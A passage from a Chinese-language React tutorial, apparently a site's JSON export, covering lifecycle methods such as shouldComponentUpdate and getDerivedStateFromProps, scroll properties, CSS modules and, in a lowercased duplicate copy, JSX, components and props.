this.listRef.current;\n      list.scrollTop = list.scrollHeight - snapshot;\n    }\n  }\n\n  render() {\n    return (\n      <div ref={this.listRef}>{/* ...contents... */}</div>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# shouldComponentUpdate()\n\nshouldComponentUpdate()这个生命周期函数（不常用的生命周期函数）在更新时的getDerivedStateFromProps()之后而render()之前被调用。\n\nshouldComponentUpdate(nextProps, nextState) {\n  return true;\n}\n\n\n1\n2\n3\n\n\n当一个组件的props或state变更，React会将最新返回的元素与之前渲染的元素进行对比，只更新改变了的DOM节点。即便如此也要花费一些时间，大部分情况下是没有问题的，一旦它慢到让然怀疑的程度了，那么使用shouldComponentUpdate()来优化它们是一个很好的选择。该生命周期函数默认返回true表示让组件进行渲染，如果返回false则跳过整个渲染过程（包括子组件）。\n\nclass CounterButton extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {count: 1};\n  }\n  // 当 props.color 或者 state.count 的值改变才需要更新\n  shouldComponentUpdate(nextProps, nextState) {\n    if (this.props.color !== nextProps.color) {\n      return true;\n    }\n    if (this.state.count !== nextState.count) {\n      return true;\n    }\n    return false;\n  }\n\n  render() {\n    return (\n      <button\n        color={this.props.color}\n        onClick={() => this.setState(state => ({count: state.count + 1}))}>\n        Count: {this.state.count}\n      </button>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# getDerivedStateFromProps()\n\n在讲getDerivedStateFromProps()之前先介绍几个概念：\n\n * 派生state：组件中的state中有部分数据来自于外部（一般是props），这样的state就是派生state。\n * 受控：用props传入数据的话，组件可以被认为是受控（因为组件被父级传入的props控制）。 -非受控：数据只保存在组件内部的 state 的话，是非受控组件（因为外部没办法直接控制 state）。\n\n派生state最常见的问题就是将受控和非受控混在一起使用。例如，将父组件传来的props的值复制给了state，而子组件内部使用state作为渲染数据源。父组件可以通过props影响到state值（甚至毫无影响），用户操作通过setState()也会影响到state的值，这导致要么state完全不受父组件源头的影响要么父组件的源数据一直覆盖子组件本身的setState()。\n\ngetDerivedStateFromProps()这个生命周期函数（不常用的生命周期函数）会在挂载时的constructor()和render()之间被调用，以及后续更新时的第一步被调用。该生命周期函数主要是为了解决派生state最常见的问题。\n\n// 它是静态方法，必须使用`static`关键字\n// 有两个入参“当前最新的props”和“上一个state”。\n// 返回一个对象来更新state，如果返回null则不更新任何内容\nstatic getDerivedStateFromProps(props, state) {}\n\n\n1\n2\n3\n4\n\n\n下面这个例子，父组件每隔5秒进行重新渲染并且改变了传给子组件的props值，而子组件的显示内容是依赖props里的email值并且还能用户输入改变这个值，这样就形成了一个“受控和非受控混在一起使用”的场景。那就可以使用getDerivedStateFromProps()了，使用前一定要明白两点！一是，不管父组件是否改变了传给子组件的props值，只要父组件进行了重新渲染，就会触发子组件的getDerivedStateFromProps()；二是，子组件的setState()也会触发getDerivedStateFromProps()，而getDerivedStateFromProps()本身又会更新子组件的state。带着这两点后去读下面的例子，特别是那段多行注释。\n\nTimer.tsx\n\nimport React, { Component } from 'react';\nimport EmailInput from './components/EmailInput';\n\nclass Timer extends Component<any, { count: number, email: string }> {\n    interval;\n    state = { count: 0, email: \"example@google.com\" };\n    componentDidMount() {\n        // 每5秒就调用setState，进而重新渲染父元素\n        this.interval = setInterval(\n            () =>\n                this.setState(prevState => ({\n                    count: prevState.count + 1,\n                    email: prevState.email + '1'\n                })),\n            5000\n        );\n    }\n    componentWillUnmount() { clearInterval(this.interval); }\n    render() {\n        return <EmailInput email={this.state.email} />;\n    }\n}\n\nexport default Timer;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nEmailInput.tsx\n\nimport React, { Component } from \"react\";\n\nclass EmailInput extends Component<{ email: string }> {\n    state = {\n        email: this.props.email,\n        prevPropsEmail: this.props.email\n    };\n    static getDerivedStateFromProps(props, state) {\n        /*\n            这个判断非常重要。首先只看子组件，假设父组件不重新渲染传给子组件的props也不变，\n            子组件的事件回调handleChange里使用setState()后，会更新一次state，\n            而setState()会触发重新渲染，从而触发getDerivedStateFromProps()和render()，\n            又由于getDerivedStateFromProps()的return语句，又会更新一次state。\n            第二次的state更新数据来源于props，props是假设不变的，那state会被重置成初始值，\n            现象就是输入框删除或修改值时，输入框没有变化，change事件相当于失效了。\n            然后再看父组件，父组件只要重新渲染就会触发子组件的getDerivedStateFromProps()，\n            不管传给子组件的props变不变。父组件重新渲染，子组件的state就会被重置。\n            综合看上面两点，就需要给getDerivedStateFromProps()内部加上这样的判断条件，\n            加上后不会因为父组件的随意重新渲染从而让子组件重置state，除非props也改变了，\n            子组件的setState()结果也不会被覆盖了，只有当来自父组件的数据源改变才更新state。\n        */\n        if (props.email !== state.prevPropsEmail) {\n            // 该生命周期函数是static的，无法使用this，得事先存储props相关的值prevPropsEmail\n            return {\n                email: props.email,\n                prevPropsEmail: props.email\n            };\n        }\n        return null;\n    }\n    render() {\n        return <input onChange={this.handleChange} value={this.state.email} />;\n    }\n    handleChange = event => {\n        this.setState({ email: event.target.value });\n    };\n}\nexport default EmailInput;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n我们建议除了“受控和非受控混在一起使用”这个场景下使用getDerivedStateFromProps()生命周期函数以外，其他场景下尽量不要使用它（可能会带来意想不到的问题）。\n\n像前面的那个例子，是可以把组件变为完全受控组件的，把数据和处理逻辑都放到父组件中去，那子组件的展示数据从props里读取，并且事件处理使用props里的回调函数，这种做法就是上一节的状态提升。这样可以避免使用getDerivedStateFromProps()，改造例子就不写了就参考状态提升那节的例子。\n\n当然，还有两种方法。给父组件加上key这个属性，先重置子组件的某些字段时，我们就改变父组件的key值让子组件直接重新初始化。\n\nclass EmailInput extends Component {\n  state = { email: this.props.defaultEmail };\n\n  handleChange = event => {\n    this.setState({ email: event.target.value });\n  };\n\n  render() {\n    return <input onChange={this.handleChange} value={this.state.email} />;\n  }\n}\n// 当 key 变化时， React 会创建一个新的而不是更新一个既有的组件\n<EmailInput\n  defaultEmail={this.props.user.email}\n  key={this.props.user.id}\n/>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n另一个方法就是，我们不直接判断email是否变化，我们直接认为它是改变了一个user，那么判断条件就会跟userId有关了。只要userId改变了，就直接更新子组件中所有跟user有关的信息。\n\nclass EmailInput extends Component {\n  state = {\n    email: this.props.defaultEmail,\n    prevPropsUserID: this.props.userID\n  };\n\n  static getDerivedStateFromProps(props, state) {\n    // 只要当前 user 变化，\n    // 重置所有跟 user 相关的状态。\n    // 这个例子中，只有 email 和 user 相关。\n    if (props.userID !== state.prevPropsUserID) {\n      return {\n        prevPropsUserID: props.userID,\n        email: props.defaultEmail\n      };\n    }\n    return null;\n  }\n\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 说说scrollHeight\n\n其实这一小节不应该放这里，主要是上面用到了scrollHeight，这里就说点关于scrollHeight的东西。我们现在以“滚动容器”为主视觉，它会有一些和滚动有关的属性，如下。但要明确它们都是滚动容器的本身属性（生活中的例子，将“陀螺手柄”和“拉条”看作为一个整体，拉条在陀螺内部的部分我们看不见，拉动的距离其实就是手里拉条这端距离靠近手柄这边外壳的距离）。\n\n * clientHeight：它的值为容器的content高度+上下内边距-水平滚动条宽度，没有水平滚动条就不用减。就理解为衡量容器的“总高度”。\n * offsetHeight：它的值为容器的content高度+上下内边距+上下边框，其实常用的是clientHeight。\n * scrollHeight：一般是容器里的总内容撑开高度最后加上容器的上下内边距。就理解为衡量总内容的“总高度”，MDN的概念有点难以理解，抓住关键字“填充所有内容”即可。\n * scrollTop：其实就是滚动的距离，这个距离是容器的“顶部” 与 容器里的总内容“顶部”的一个距离。\n\n你可以想象一下，滚动条在最顶端时的情况，此时容器的顶部与总内容的顶部是“重合的”，它们之间此时没有距离，那么scrollTop就为0了。\n\n而当滚动条在最底端时，容器的底部与总内容的底部是“重合的”，那么它们的“顶部”的距离此时是最大的，那么此时的距离值到底是多少呢？那就是容器的scrollHeight减去clientHeight，也就是减去重合的这部分高度。所以经常用element.scrollHeight - element.scrollTop === element.clientHeight来判断内容或者说滚动条是否滚动到了底部。\n\n其实还有一些细节问题，这个scrollHeight为什么额外算上了“容器的上下内边距”，其实这个与触发滚动的条件有关了。比如CSS中怎么触发滚动？先设置overflow: auto或者overflow: scroll，当总内容的“布局尺寸”超过容器的content区域就会触发滚动。布局尺寸你可以先理解为所有盒子属性加起来（包括margin）（还可以理解为撑开的高度），容器的content你可以理解为就是元素的height和width（正常盒模型）。\n\n那么js这边呢？其实就是上面css条件的“两侧”都加上了“容器的上下内边距”，例如容器的content加上“容器的上下内边距”不就是刚刚说的clientHeight嘛，内容的布局尺寸加上“容器的上下内边距”不就是刚刚说的scrollHeight，也就是一旦scrollHeight超过clientHeight就会触发滚动。这样加也是js为了用clientHeight整体描述容器，以及用scrollHeight整体描述它的总内容。\n\n\n# 八、React中的CSS模块化\n\n\n# 8.1 原生css的问题\n\n原生css在项目中使用时经常会出现全局污染、命名混乱和无法共享变量等问题。\n\n全局污染：原生css在使用时没有本地作用域，它声明的样式都是全局的。也就是说页面上的元素可以使用项目中任何css文件中的样式，当然前提是能访问上并匹配上，并且css样式还能覆盖前面的部分样式。这就导致在修改BUG和重构项目时，分不清哪些css作用于哪些html，修改css要瞻前顾后怕影响到其他组件。\n\n命名混乱：原生css的选择器命名在项目过大时会变得过于困难和混乱。选择器的名称会考虑根据它所处的页面和组件等结构来书写前缀，不然很容易和其他元素的选择器重名。又或者是多人开发一个大型项目，并且多分支进行，这样的命名冲突会源源不同，而命名风格还各不相同。\n\n无法共享变量：像color这样的样式变量，在一个页面的很多选择器上是共用的，又或者一段样式要在很多页面上是共用的，原生的css也没有非常好的解决办法。\n\n\n# 8.2 CSS模块化\n\nCSS模块化可以将css样式变成一个个独立存在的模块，css模块内部的内容当然也是独立的不会影响到其他css模块，在需要使用css时就将需要的css模块导入到对应的react组件中。这样就可以解决原生CSS的全局污染和命名混乱的问题，不好的地方是需要一点点配置，然后它在debug时显示的className会比较奇怪（css样式动态注入的，属于css in js的范畴了）调试会麻烦一些。\n\n在一般的react项目中，css文件初始导入方式是这样的：import './xxx.css'，其实这还是原生的css用法，只不过将css分割成小小的几部分，还是不具有独立性。真正做到CSS模块化，需要这样写：import styles from './xxx.css'，将css样式以一个对象的形式导入到react组件中。\n\n而import styles from './xxx.css'这样的css导入写法可能会报错，这个就是因为css缺少ts声明文件（*.d.ts），解决的方法就是在项目的src目录下创建一个css的ts声明文件custom.d.ts：\n\n// 声明一个es6模块，导入文件通常是*.css这样的，这个模块以一个对象形式暴露\ndeclare module '*.css' {\n    const css: { readonly [key: string]: string };\n    export = css;\n}\n\n\n1\n2\n3\n4\n5\n\n\n然后就是css文件的命名规范，头部名称基本和tsx/jsx文件一致，.css后缀的前面必须得添加一个.module，以免出现不必要的问题（其实目前添加.module后就不用自己写ts声明文件了，上一步custom.d.ts可以省略）。别忘了将css文件和tsx/jsx文件放在同一个文件夹（例如某个component）下。\n\n接下来我们只需要将UI元素与这个styles对象关联来就可以让样式生效了，具体就是在元素jsx上使用className绑定styles里对应的字段，看清楚不是style字段哦！\n\n// 原生CSS\nimport './NumberInput.css';\n\nreturn <input className=\"inputDiv\" value={this.props.inputValue} onChange={this.handleValue} />\n\n// CSS模块化，文件名中间是module\nimport styles from './NumberInput.module.css';\n\nreturn <input className={styles.inputDiv} value={this.props.inputValue} onChange={this.handleValue} />\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 8.3 CSS模块智能提示\n\n因为我们使用ts，styles这个对象里的字段提示是非常有必要的，那么就得安装一个插件npm install typescript-plugin-css-modules --save-dev。\n\n然后打开项目的tsconfig.json文件，在compilerOptions项中注册上面这个插件：\n\n\"compilerOptions\": {\n    \"plugins\": [{ \"name\": \"typescript-plugin-css-modules\" }]\n}\n\n\n1\n2\n3\n\n\n如果使用的VSCode编辑器，需要开启settings.json中的\"typescript.enablePromptUseWorkspaceTsdk\": true这个选项（VSCode须得1.45版本以上才有这个选项）就能让styles后面拥有智能提示。\n\n{\n    \"typescript.tsdk\": \"node_modules/typescript/lib\", // 根据项目的实际typescript所在填写\n    \"typescript.enablePromptWorkspaceTsdk\": true\n}\n\n\n1\n2\n3\n4\n\n\n\n# 8.4 用类似方式加载资源\n\n像png、svg、jpg等资源文件，都可以通过上面的方式来加载，也不需要自己写ts声明文件，因为react项目基本上都已经准备好了。\n\nimport styles from './NumberInput.module.css';\nimport logo from './assets/images/logo.svg';\n\n<img src={logo} className={styles.appLogo} alt=\"logo\" />\n\n\n1\n2\n3\n4\n\n\n如果是加载字体，就用原生css加载字体方式（@font-face加载字体，font-family使用字体）具体可以看这篇——字体。",normalizedContent:"# react基础\n\n\n# 一、jsx\n\n\n# 1.1 什么是jsx\n\nconst el = <h1 classname=\"greet\">hello world!</h1>;\n\n\n1\n\n\n看到上面这个赋值语句，你可能会奇怪它为什么不是字符串包裹的？其实它是react中一种规定写法——jsx。使用jsx写出来的元素既不是字符串也不是html元素，比如上面的h1相当于react.createelement('h1', {classname: 'greet'}, 'hello world!')，生成了react“元素”这样的一个对象。\n\n// 另一种写法。你可以console.log('el', el)看一下el是否是一个object，它的属性要比真实dom要少很多\nconst el = { type: 'h1', props: { classname: 'greet', children: 'hello world!' } };\n// 相当于react.createelement('h1', {classname: 'greet'}, 'hello world!')\n\n\n1\n2\n3\n\n\n可以看一下jsx多行的写法：\n\n// 多行建议加上()，避免遇到自动插入分号的陷阱\nconst el = (\n  <div>\n    <h1>hello!</h1>\n    <h2>good to see you here.</h2>\n  </div>\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n为什么要使用jsx？其实react并没有强制人们使用jsx，它建议使用这种新的写法。这种写法的好处就是它非常接近html的书写方式，两者差别不大这在下一节里会讲到，另一个好处就是它可以很容易地和js代码贴合在一起，比如后面会讲到的条件渲染等等。要实现函数式编程或者组件化编写页面，将ui视图表现和渲染逻辑放在一起是很好的办法，不然按照传统的写法html和js基本是要进行分离的。当然，放在一起后要对组件做到更合适的拆分，不然组件就会显得很臃肿。\n\n\n# 1.2 jsx中的标签和属性\n\n原生的html标签在jsx里还是原来的写法，但是在jsx里使用自定义组件时，这个组件的标签名要首字母大写。\n\n然后jsx属性跟html的属性不一样，使用首字母小写的驼峰命名法，比如classname其实就是html中的class，tabindex则是tabindex等等。还有jsx属性可以是表达式，使用{}来承载表达式。\n\n// app是自定义组件的引用，用<>括起来作为标签来使用，并且<app />是首字母大写\nreactdom.render(<app />, document.getelementbyid('root'));\n// classname和tabindex要是首字母小写的驼峰命名\nconst el1 = <h1 classname=\"greet\">hello world!</h1>;\nconst el2 = <div tabindex=\"0\"></div>;\n// jsx属性可以是表达式\nconst el3 = <img src={user.avatarurl}></img>;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nps：想要在文件中写jsx这种语法，必须引入react，即import react from 'react';。只有引入了react，在文件中的那些jsx标签才不会报错。\n\n\n# 1.3 jsx与表达式\n\n可以在jsx里嵌入变量引用、计算式、函数调用等这些表达式，具体是使用{}并在这个花括号里写上你想要的表达式。{}可以是标签的显示内容，也可以是标签属性上的值。\n\n// 嵌入变量引用\nconst str = 'world!';\nconst el1 = <h1>hello {str}</h1>;\n// 嵌入函数调用\nconst user = { first: 'harper', last: 'perez' };\nfunction func(user) { return user.first + ' ' + user.last; }\nconst el2 = <h1>hello {func()}</h1>;\n// src属性值\nconst el3 = <img src={user.avatarurl}></img>;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n上面的一些例子是将jsx作为值赋给一个常量，其实它也可以被赋值给变量，也可以作为参数传入函数，也可以作为函数的返回值被return。\n\nfunction getgreeting(user) {\n    if (user) {\n        return <h1>hello, {func(user)}!</h1>;\n    }\n    return <h1>hello, stranger.</h1>;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n{}的使用跟vue的模板语法不一样，特别是在{}里写对象时，react就是{{a:'a',b:'b'}}这种，非常像vue的{{}}，但在react里它表示一个具有属性a和b的字面量对象。比较常见的场景就是在jsx里写style样式。\n\nconst data = '你好';\n// {}里的{}是一个样式对象。样式对象的属性值要用引号引起来，属性名要首字母小写的驼峰写法。\nconst el = (\n  <span style={{color:'white', fontsize:'15px'}}>{data}</span>\n);\n\n\n1\n2\n3\n4\n5\n\n\n\n# 1.4 jsx中的子元素\n\njsx标签里没有子元素时，可以直接使用/>来闭合（xml语法）。如果有子元素，可以使用多个子元素。但是，最顶层的父元素只能有一个（和vue模板语法一样只能有一个根节点）。\n\nconst el = (\n  <div>\n    <h1>hello!</h1>\n    <h2>good to see you here.</h2>\n  </div>\n  <h1>hello!</h1> // 错误！！！只能有一个顶级父元素\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n但是有时候我们确实不想再多套一层标签，怎么办呢？可以使用<fragment>来充当顶级父元素，最后渲染在页面时<fragment>并不会显示在页面只会显示子元素的内容（vue模板语法是<template>）。\n\nconst el = (\n    <fragment>\n        <div>\n            <h1>hello!</h1>\n            <h2>good to see you here.</h2>\n        </div>\n        <h1>hello!</h1>\n    <fragment/>\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 1.5 条件、列表渲染\n\n我们可以根据不同的条件或者状态来选择渲染哪部分ui，也就是在组件返回出参前根据需要来选择返回什么样的jsx。\n\nrender() {\n  const isloggedin = this.state.isloggedin;\n  if (isloggedin) {\n    return <usergreeting />;\n  }\n  return <guestgreeting />;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n除了上面这种使用if来控制最后返回的jsx，我们也可以使用&&运算符来改变最后返回的jsx，要主要这是一个表达式得使用{}来承载。\n\nrender() {\n  const unreadmessages = this.state.unreadmessages;\n  // unreadmessages的长度决定h2是否显示\n  return (\n    <div>\n      <h1>hello!</h1>\n      {unreadmessages.length > 0 &&\n        <h2>\n          you have {unreadmessages.length} unread messages.\n        </h2>\n      }\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n除了if和&&以外，还比较常见的就是? :三元运算符了，同样也是表达式也是需要{}来承载的。\n\nrender() {\n  const isloggedin = this.state.isloggedin;\n  return (\n    <div>\n      {isloggedin\n        ? <logoutbutton onclick={this.handlelogoutclick} />\n        : <loginbutton onclick={this.handleloginclick} />\n      }\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n在极少数情况下，你可能希望能隐藏组件，即使它已经被其他组件渲染。若要完成此操作，你可以让 render 方法直接返回 null，而不进行任何渲染。\n\nrender() {\n  if (!this.state.warn) {\n    return null;\n  }\n  return (\n    <div classname=\"warning\">\n      warning!\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n条件渲染在上面可以用if语句，可以用&&运算符，可以用三元运算符。而列表渲染，可以用for语句，也可以用map()等遍历函数（表达式）。\n\n// for语句提前处理\nrender() {\n  const array = ['张三', '李四', '王五'];\n  const newarr = [];\n  for (let i = 0; i < array.length; i ++) {\n      newarr.push(<li key={i}>{array[i]}</li>)\n  }\n  return (\n    <ul>\n        {newarr}\n    </ul>\n  );\n}\n// map的方式（表达式）\nrender() {\n  const array = ['张三', '李四', '王五'];\n  return (\n    <ul>\n        {\n          array.map((item, index) =>{\n              return <li key={index}>{item}</li>\n          })\n        }\n    </ul>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上示例就是jsx的灵活之处了，jsx外部可以用js语句处理好交给render函数里的jsx使用，像ul就会遍历数组（不会遍历对象），jsx内部的{}只能使用js表达式。vue的模板语法里面就不能使用js语句（当然vue是支持jsx的），模板语法来实现条件渲染和列表渲染一般是通过v-if和v-for这样的vue内置指令，指令的值必须得是js表达式。\n\n说了这么多，你应该明白jsx和模板语法大概的相同和不同之处了吧，它们内部只能使用js表达式（三元运算、函数调用、变量赋值等），不同就是js语句可配合jsx使用，而模板语法不可以。jsx灵活贴近原生js，模板语法需要特殊指令但运行性能更好。\n\n\n# 1.6 渲染react元素\n\n在项目的显示入口文件index.html里有一个<div id=\"root\"></div>，这个就是根节点。react会通过reactdom.render()函数来管理挂载到根节点的react元素，并且会渲染这个react元素。\n\nconst element = <h1>hello, world</h1>;\nreactdom.render(element, document.getelementbyid('root'));\n\n\n1\n2\n\n\n但是react元素是不可变对象，它一旦被创建，就无法更改它的子元素或者属性。那么想改变ui的效果，必须创建一个全新的react元素再传入reactdom.render()。\n\n// 尽管每一秒我们都会新建一个描述整个 ui 树的元素，其实react dom 只会更新实际改变了的内容。\nfunction tick() {\n    const element = (\n        <div>\n            <h1>hello, world!</h1>\n            <h2>it is {new date().tolocaletimestring()}.</h2>\n        </div>\n    );\n    reactdom.render(element, document.getelementbyid('root'));\n}\nsetinterval(tick, 1000); // 每隔一秒会重新创建react元素并传到reactdom.render()里渲染\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n注意：一般reactdom.render()只会使用一次，尽量不要使用上面的这种方式来改变页面的显示。后面会学习state，可以使用setstate()来触发组件进行重新渲染。\n\n\n# 二、组件化开发\n\n\n# 2.1 组件化以及组件的结构\n\n前端开发常用方式是对一个页面进行拆分，可以拆分成多个独立可复用的组件，组件之间可以是父子关系可以是兄弟关系也可以没有关系。\n\n组件在概念上类似于js的函数（入参props，出参是react元素），可以用es6的形式来使用它，即通过import和export来引入和使用。引入一个新组件并将其嵌入到自身组件的ui上，嵌入时是不会显式地实例化这个新组件（意思不会new xx()而会<xx />）。当然，组件也不会刻意去继承另一个组件（除了继承react.component）。\n\napp.jsx\n\nimport react from 'react';\n\nfunction app() {\n  return (\n    <div>hello world!</div>\n  );\n}\n// 将自定义组件app导出去供别人使用\nexport default app;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nindex.jsx\n\nimport react from 'react';\nimport reactdom from 'react-dom';\nimport app from './app';\n// 导入app，并以<app />的形式使用（不要使用new app()的形式），自定义组件使用时必须首字母大写\nreactdom.render(\n  <app />,\n  document.getelementbyid('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n组件的两种写法：\n\n// 第一种：函数组件，必须要return，一般返回的是一个jsx\nfunction welcome() {\n    // 该函数组件里面的this一般是undefined\n    return <h1>hello world!</h1>;\n}\n// 第二种：class组件(两种组件是等效的)，必须要有render函数，该函数必须return，一般返回的是一个jsx\nclass welcome extends react.component {\n    render() {\n        // 该类组件的render函数里面的this一般是本组件实例对象。这个对象使用调用者帮忙实例化的\n        return <h1>hello world!</h1>;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n像前面的一些例子都是单纯返回一个react元素，其实组件内部还能写react元素对应的处理逻辑，也就是说组件内部包含了ui和处理逻辑，这是一种松散耦合的结构。下面这个例子可以先不看代码细节，只需看代码结构中有ui（render方法）和处理逻辑（事件处理）两部分。这样对开发人员在视觉上有较好的辅助作用。还有就是组件比较容易维护，组件可以复用在很多页面，也比较符合传统开发人员的开发习惯（函数式）。\n\n// toggle组件\nclass toggle extends react.component {\n    constructor(props) {  // 父组件传递的数据props\n        super(props);\n        this.state = {istoggleon: true}; // 组件内部数据state\n        this.handleclick = this.handleclick.bind(this); // 绑定this\n    }\n    // 本组件渲染内容（ui）\n    render() {\n        return (// 包裹()的原因是避免自动加;符号\n            // jsx语法，属性名onclick必须是首字母小写的驼峰写法\n            // 属性值是{表达式}形式，元素内容也是{表达式}形式\n            <button onclick={this.handleclick}>\n                {this.state.istoggleon ? 'on' : 'off'}\n            </button>\n        );\n    }\n    // 处理点击事件的逻辑\n    handleclick() {\n        // 改变state的值，setstate的实参可以是对象也可以是函数，state就是原来的state\n        this.setstate(state => ({\n            istoggleon: !state.istoggleon\n        }));\n    }\n}\nreactdom.render(<toggle />, document.getelementbyid('root'));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 2.2 组件的props\n\n在上一小节里构造函数的入参使用了props，它就是当前组件的入参。用来接收调用处标签上的属性以及该标签的子元素。需要注意的是props是只读的，不允许被修改。\n\nindex.tsx\n\nimport react from 'react';\nimport reactdom from 'react-dom';\nimport app from './app';\n// 显示结果：hello world!!!\nreactdom.render(\n  <app str=\"hello\">!!!</app>, // 调用处\n  document.getelementbyid('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\napp.tsx\n\nimport react, { fragment, reactelement } from 'react';\n// str是调用app时传入的属性，children是调用app时app的子元素也就是文本，其实子元素也可以是标签\nfunction app(props: { str: string, children: reactelement | string }) {\n  return (\n    <fragment>{props.str} world{props.children}</fragment>\n  );\n}\n\nexport default app;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n上面的例子我们使用ts编写的，传进来的props对象必须与调用app时的属性和子元素对应，不然ts会报错。\n\n如果通过props传递的参数很多，例如xxa={params.xxa} xxb={params.xxb} xxc={params.xxc}，你是可以通过props将params这个对象传递过去，子组件那边使用就是props.params。其实可以通过{...params}批量传输参数，而子组件接收就不涉及到params这个名字，而直接是props.xxa、props.xxb、props.xxc。例子如下。\n\nconst person = {\n  name: '张三',\n  age: 18,\n}\nconst a = 'a'\n// 其实就是将name={person.name}和age={person.age}放到<app/>属性位置上了\nreactdom.render(\n  <react.strictmode>\n    <app {...person} a={a}/>\n  </react.strictmode>,\n  document.getelementbyid('root')\n);\nfunction app(props) {\n  // 页面显示的是 张三18a\n  return (\n    <div classname=\"app\">\n      <span>{props.name}</span>\n      <span>{props.age}</span>\n      <span>{props.a}</span>\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n上面这种方式非常像js展开运算符（剩余运算符），可以看一下展开语法(spread syntax)。展开运算符可以单独用在数组上，例如const arr=[1,2];console.log(...arr)，也可以搭配[]使用，例如const arr=[1,2];console.log([...arr])，生成了一个新数组。而展开运算符不可以单独用在对象上，用在对象只能搭配{}来用，例如const obj={a:'a'};console.log({...obj})（生成新对象），去掉这个{}就会报错。况且react的{...params}中的{}是jsx里的分隔符用于承载js表达式，至于...params表达式是react提供的语法糖，将params的每个属性以及属性值按照组件props方式传递过去了，放到了子组件的props对应同名属性上了。\n\n我们可以为子组件的props属性加上“类型”、“必要性”和“默认值”等设置。用到的是import proptypes from 'prop-types'这个包，具体写法如下\n\nconst person = {\n  name: '张三',\n  speak: () =>{\n    console.log('speak');\n  }\n}\nfunction app(props) {\n  return (\n    <div classname=\"app\">\n      <span>{props.name}</span>\n      <span>{props.age}</span>\n      <span>{props.sex}</span>\n      <span>{props.speak()}</span>\n    </div>\n  );\n}\napp.proptypes = {\n  name: proptypes.string.isrequired, // 类型和必要性\n  age: proptypes.number,\n  sex: proptypes.string,\n  speak:proptypes.func // 函数就要特别注意，是func\n}\napp.defaultprops = { // 设置默认值\n  sex: '男',\n  age: 18\n}\nreactdom.render(\n  <react.strictmode>\n    <app {...person}/>\n  </react.strictmode>,\n  document.getelementbyid('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n上面用的是函数式组件，如果用类组件，可以将proptypes和defaultprops移到class内部（函数式组件只能放在function外部），使用static关键字即可。\n\nclass app extends react.component {\n  constructor(props) {\n    super(props)\n  }\n  // 固定的属性名proptypes\n  static proptypes = {\n    name: proptypes.string.isrequired, // 类型和必要性\n    age: proptypes.number,\n    sex: proptypes.string,\n    speak:proptypes.func // 函数就要特别注意，是func\n  }\n  // 固定的属性名defaultprops\n  static defaultprops = { // 设置默认值\n    sex: '男',\n    age: 18\n  }\n  render() {\n    return (\n      <div classname=\"app\">\n        <span>{props.name}</span>\n        <span>{props.age}</span>\n        <span>{props.sex}</span>\n        <span>{props.speak()}</span>\n      </div>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 2.3 组件的state\n\n可以回过头再看一下渲染react元素中那个时钟例子，其实可以使用props进行改造，只要每秒更改传入组件的props，把props里的秒值显示在组件上就可以了，但是它并没有解决reactdom.render()多次调用的问题，每秒重新调用这个函数是比较夸张的。\n\n其实呢，使用state来改造是最恰当的，因为state是组件内部状态存储的变量，组件内部的变化优先使用内部的state，除非组件确实受外部控制才使用props。（state是类组件实例上的，函数组件的this是undefined，函数组件可以通过hooks来使用state）\n\n使用state时要注意的点，state是不能随意改变的，比如this.state.xxx = ''这样是不允许的（可在构造函数中赋值），只能使用this.setstate({xxx: 